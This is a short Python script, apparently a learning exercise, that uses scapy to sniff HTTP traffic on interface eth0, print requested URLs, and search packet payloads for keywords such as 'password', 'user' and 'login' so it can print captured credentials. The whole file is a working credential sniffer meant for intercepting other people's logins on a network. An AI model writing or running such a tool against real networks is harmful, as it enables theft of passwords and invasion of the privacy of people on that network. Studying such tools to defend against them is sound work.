#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
def sniff_packet(interface):
    scapy.sniff(iface = interface , store = False , prn = sniffed_process)

def sniffed_process(packet):
    if packet.haslayer(http.HTTPRequest) :
        url = str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        print("[+] HTTP REQUEST ---" + url)
        if packet.haslayer(scapy.Raw):
            key = ["username" , "Key" , "key" ,"user" , "pwd" , "uname" , "login" , "password" , "Username" , "Password" , "pass" , "Pass"]
            load = str(packet[scapy.Raw].load)
            for element in key:
                if element in load :
                    print("[+] POSSIBLE PASSWORD\n"+load + "\n\n")
                    break




sniff_packet("eth0")
